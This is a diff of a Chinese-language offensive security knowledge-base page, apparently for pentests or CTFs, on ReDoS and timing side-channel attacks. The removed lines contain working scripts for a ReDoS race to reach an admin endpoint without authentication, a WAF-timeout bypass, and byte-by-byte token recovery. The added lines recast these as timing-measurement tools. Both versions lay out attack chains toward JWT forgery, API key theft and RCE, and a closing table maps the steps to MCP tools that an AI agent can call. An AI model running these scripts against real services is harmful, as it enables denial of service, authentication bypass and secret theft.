+| 输入被正则验证 | 递增长度曲线 | 长度线性增加，耗时指数/超线性增长 | 所有长度耗时随机跳动 |
+| Node/单线程服务 | 并发 trigger + probe | trigger 时普通 probe 延迟同步升高 | 只有 trigger 自己慢 |
+| WAF 复杂规则 | prefix 触发回溯 + payload 后缀 | WAF 错误/超时后业务处理推进 | WAF 统一 403 |
+| token/API key 比较 | 多样本逐字符 timing | 正确前缀均值/中位数稳定偏高 | 差异小于噪声 |
+| rate limit/queue | 交错 baseline/control | control 与 candidate 同时慢 | 排队/限速，不是侧信道 |
 
-    # 模式 C: 路径匹配 — Nginx/Apache rewrite rules
-    "path_rewrite": r"^(/[^/]+)+\/?$",
-}
+## 工作流
+
+```text
+建立 baseline 和 control 输入
+  → 长度/前缀单变量增长
+  → 多轮采样并裁剪异常值
+  → 对比 trigger 与 probe 是否相关
+  → 只在稳定差异时推进利用链
+  → 记录分布、阈值、失败样本
 ```
 
-## ReDoS → Auth Bypass (Node.js)
+## 0. ReDoS 增长曲线
 
 ```python
-# Node.js 单线程 event loop → ReDoS 阻塞整个进程
-# 在认证检查卡住时，并发发送未认证请求 → 可能通过
+#!/usr/bin/env python3
+import argparse
+import json
+import statistics
+import time
+import requests
 
-import concurrent.futures, requests, time
+def measure(url, param, value, samples):
+    out = []
+    for _ in range(samples):
+        t0 = time.perf_counter()
+        r = requests.get(url, params={param: value}, timeout=30)
+        out.append((time.perf_counter() - t0) * 1000)
+    xs = sorted(out)
+    trim = xs[1:-1] if len(xs) > 4 else xs
+    return {"status": r.status_code, "mean_ms": statistics.mean(trim), "median_ms": statistics.median(trim), "min_ms": min(xs), "max_ms": max(xs)}
 
-def redos_auth_bypass(target: str, evil_input: str):
-    """利用 ReDoS 卡住认证检查，并发发送未认证请求"""
-    results = []
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--url", required=True)
+    ap.add_argument("--param", required=True)
+    ap.add_argument("--char", default="a")
+    ap.add_argument("--suffix", default="!")
+    ap.add_argument("--start", type=int, default=8)
+    ap.add_argument("--stop", type=int, default=28)
+    ap.add_argument("--step", type=int, default=4)
+    ap.add_argument("--samples", type=int, default=5)
+    args = ap.parse_args()
+    for n in range(args.start, args.stop + 1, args.step):
+        value = args.char * n + args.suffix
+        print(json.dumps({"n": n, "result": measure(args.url, args.param, value, args.samples)}, ensure_ascii=False))
 
-    def send_unauthorized():
-        r = requests.get(f"{target}/admin/flag",
-            headers={"Authorization": "Bearer invalid"})
-        return ("unauth", r.status_code, r.text[:50])
-
-    def trigger_redos():
-        # 提交触发 ReDoS 的输入
-        r = requests.post(f"{target}/api/validate", json={
-            "email": evil_input   # 触发正则回溯
-        })
-        return ("redos", r.status_code, r.text[:50])
-
-    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
-        # 先发 5 个 ReDoS 请求
-        futures = [ex.submit(trigger_redos) for _ in range(5)]
-        # 同时发 25 个未认证请求
-        futures += [ex.submit(send_unauthorized) for _ in range(25)]
-
-        for f in concurrent.futures.as_completed(futures):
-            label, status, body = f.result()
-            if label == "unauth" and status == 200:
-                print(f"[!] AUTH BYPASS via ReDoS race!")
-            results.append((label, status))
-    return results
+if __name__ == "__main__":
+    main()
 ```
 
-## ReDoS → WAF 绕过
+成功样本：`n` 增长时 median 呈明显超线性增长，并且 control 输入不随之增长。失败样本：所有输入一起变慢，通常是网络、限速或排队。
+
+## 1. 正则族与输入模板
+
+| 正则族 | 输入模板 | 观察点 |
+|---|---|---|
+| `(a+)+$` | `a^n + !` | 嵌套量词回溯 |
+| `(a|aa)+$` | `a^n + !` | 分支回溯 |
+| `([a-z]+)*$` | `a^n + !` | group + star |
+| 路径 rewrite | `/a/a/.../!` | 路由层耗时 |
+| email/url validator | 长 local/domain + 破坏后缀 | 注册/搜索/导入接口 |
+
+## 2. 事件循环 oracle
 
 ```python
-# WAF 在其正则引擎中检查 payload → 触发 ReDoS → WAF timeout → pass through
+#!/usr/bin/env python3
+import argparse
+import concurrent.futures
+import json
+import time
+import requests
 
-def waf_redos_bypass(waf_target: str, payload: str):
-    """发送使 WAF 正则卡死的 payload"""
-    # 在正常攻击 payload 前附加 ReDoS 触发器
-    # 使 WAF 在到达真正的攻击 payload 前就超时
-    redos_prefix = "A" * 100 + "!"
-    # WAF 正则: /^[a-zA-Z0-9 ]+$/
-    # 输入: AAAA...!  → 回溯 → 超时 → WAF skip
+def hit(method, url, **kwargs):
+    t0 = time.perf_counter()
+    r = requests.request(method, url, timeout=30, **kwargs)
+    return {"status": r.status_code, "ms": round((time.perf_counter() - t0) * 1000, 2), "sample": r.text[:120]}
 
-    r = requests.post(waf_target, data={
-        "input": redos_prefix + payload
-    })
-    return r
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--trigger-url", required=True)
+    ap.add_argument("--probe-url", required=True)
+    ap.add_argument("--param", required=True)
+    ap.add_argument("--evil", required=True)
+    ap.add_argument("--workers", type=int, default=12)
+    args = ap.parse_args()
+    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as ex:
+        futs = []
+        for _ in range(args.workers // 3):
+            futs.append(("trigger", ex.submit(hit, "GET", args.trigger_url, params={args.param: args.evil})))
+        for _ in range(args.workers):
+            futs.append(("probe", ex.submit(hit, "GET", args.probe_url)))
+        for label, f in futs:
+            try:
+                print(json.dumps({"type": label, **f.result()}, ensure_ascii=False))
+            except Exception as e:
+                print(json.dumps({"type": label, "error": str(e)}, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
 ```
 
-## 时序攻击 — Token/Key 逐字节恢复
+命中判断：trigger 慢的同时 probe 也稳定慢，说明共享 event loop / worker pool 被卡住；只有 trigger 慢通常只是局部正则耗时。
+
+## 3. Timing 逐字符统计
 
 ```python
-# 非恒定时间比较 → 逐字节泄露
-import time, statistics
+#!/usr/bin/env python3
+import argparse
+import json
+import statistics
+import string
+import time
+import requests
 
-def timing_attack_byte(target_url: str, known_prefix: str,
-                       charset: str = "abcdefghijklmnopqrstuvwxyz0123456789",
-                       samples: int = 30):
-    """统计时序攻击恢复下一个字节"""
-    times = {}
+def sample(url, param, value, samples):
+    xs = []
+    for _ in range(samples):
+        t0 = time.perf_counter()
+        requests.get(url, params={param: value}, timeout=10)
+        xs.append((time.perf_counter() - t0) * 1_000_000)
+    xs.sort()
+    trim = xs[2:-2] if len(xs) > 8 else xs
+    return {"mean": statistics.mean(trim), "median": statistics.median(trim), "stdev": statistics.pstdev(trim), "n": len(trim)}
 
-    for ch in charset:
-        test = known_prefix + ch
-        measurements = []
-        for _ in range(samples):
-            start = time.perf_counter()
-            r = requests.get(target_url, params={"token": test})
-            end = time.perf_counter()
-            measurements.append((end - start) * 1_000_000)  # 微秒
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--url", required=True)
+    ap.add_argument("--param", default="token")
+    ap.add_argument("--prefix", default="")
+    ap.add_argument("--charset", default=string.ascii_lowercase + string.digits)
+    ap.add_argument("--samples", type=int, default=20)
+    args = ap.parse_args()
+    rows = []
+    for ch in args.charset:
+        value = args.prefix + ch
+        stat = sample(args.url, args.param, value, args.samples)
+        rows.append({"ch": ch, **stat})
+    rows.sort(key=lambda x: x["median"], reverse=True)
+    print(json.dumps({"prefix": args.prefix, "top": rows[:8], "all": rows}, ensure_ascii=False))
 
-        # 去掉明显异常值
-        measurements.sort()
-        trimmed = measurements[3:-3]  # 去掉最高/最低 3 个
-        times[ch] = statistics.mean(trimmed)
-
-    # 正确的字节应该多一次比较 → 略慢
-    # 找出显著慢的
-    baseline = statistics.median(list(times.values()))
-    for ch, t in times.items():
-        if t > baseline * 1.5:  # 50% 以上的差异
-            print(f"[!] Next byte: {ch} ({t:.1f}μs vs baseline {baseline:.1f}μs)")
-            return ch
-    return None
-
-# 使用:
-# known = ""
-# for i in range(32):
-#     next_byte = timing_attack_byte("https://target.com/verify", known)
-#     if next_byte:
-#         known += next_byte
-#     else:
-#         break
-# print(f"Recovered token: {known}")
+if __name__ == "__main__":
+    main()
 ```
 
-## JWT HS256 Key 时序泄露
+判定矩阵：
 
-```python
-# Go 的 == 操作符在 JWT library 中非恒定时间比较 iss/aud
-# → 可泄露 trusted issuer URL
-# 类似: Node.js crypto.timingSafeEqual 未使用时
+| 现象 | 解释 | 下一步 |
+|---|---|---|
+| top1 多轮一致且差距 > stdev | 可能存在前缀比较 | 扩展下一位 |
+| top 候选轮换 | 噪声覆盖 | 增加样本、换时间窗口 |
+| 所有候选一起慢 | 限速/排队 | 加 control，不推进 |
+| 正确长度突然固定慢 | 长度先验泄露 | 先恢复长度 |
 
-def jwt_claim_timing_leak(token: str, target: str):
-    """探测 JWT iss claim 的 trust list"""
-    candidates = [
-        "https://auth.google.com",
-        "https://auth.target.com",
-        "https://sso.internal",
-        "https://okta.target.com",
-    ]
-    for iss in candidates:
-        # 修改 token 中的 iss claim
-        import jwt as pyjwt
-        payload = pyjwt.decode(token, options={"verify_signature": False})
-        payload["iss"] = iss
-        # 用空 key 签名 + 发送
-        # 正确 iss 的处理时间 vs 错误 iss 的处理时间有差异
-        ...
-```
+## 4. WAF timeout 分叉
+
+| 变体 | 操作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| redos prefix | 复杂输入 + benign payload | WAF 超时或业务响应推进 | 统一 403 |
+| payload before prefix | payload + 复杂输入 | WAF 先拦截 | 顺序无差异 |
+| control prefix | 同长度简单输入 | 不慢 | control 同样慢 |
+| 并发 trigger | 多个慢输入 | 后续请求排队 | 单请求局部慢 |
 
 ## 攻击链
 
-```
-ReDoS → Node.js event loop 阻塞 → Auth bypass → Admin API
-ReDoS → WAF timeout → SQLi/XSS payload pass through → RCE
-Timing attack → CSRF token byte-by-byte → 完整 token → CSRF 攻击
-Timing attack → HMAC key → JWT 伪造 → 任意用户
-Timing attack → API key → cloud 资源访问 → 数据泄露
+```text
+ReDoS
+  → 正则增长曲线命中
+  → 事件循环/网关/WAF 分叉
+  → 认证、过滤、队列或缓存行为差异
+  → 转 SQLi/XSS/API/业务动作
+
+Timing
+  → baseline/control 样本
+  → 逐字符候选统计
+  → token/secret/issuer 前缀恢复
+  → 转 CSRF/JWT/API key 链
 ```
 
 ## Evidence
 
-记录: 每字节采样时间分布 (均值/标准差/样本数)、ReDoS 触发时的事件循环阻塞时间、WAF 绕过证明
+| 项 | 记录内容 |
+|---|---|
+| baseline | control 输入、样本数、均值/中位数/stdev |
+| ReDoS 曲线 | 长度、payload、每档耗时、状态码、响应 hash |
+| 并发 oracle | trigger/probe 时间相关性、worker 数、失败请求 |
+| Timing 统计 | prefix、charset、top 候选、多轮稳定性 |
+| 成功样本 | 稳定耗时差异导致 token/状态/过滤/flag 推进 |
+| 失败样本 | 排队、限速、缓存、网络抖动、所有候选同分布 |
+| 下一跳 | WAF 分叉转具体注入；token 转 CSRF/JWT；DoS 维度转 22-dos |
 
 ## MCP 工具映射
 
-AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
-
-| 攻击步骤 | MCP 工具 | 说明 |
-|---------|---------|------|
-| ReDoS 探测 | `http_probe` | 发送正则炸弹 payload |
-| 按信号查技术 | `kb_router` | 搜索 redos 相关技术文件 |
+| 步骤 | MCP 工具 | 说明 |
+|---|---|---|
+| 时延探测 | `http_probe` | 固定输入长度和响应时间采样 |
+| 知识路由 | `kb_router` | 按 redos、timing、side channel、event loop 搜索 |
 
 
 ---
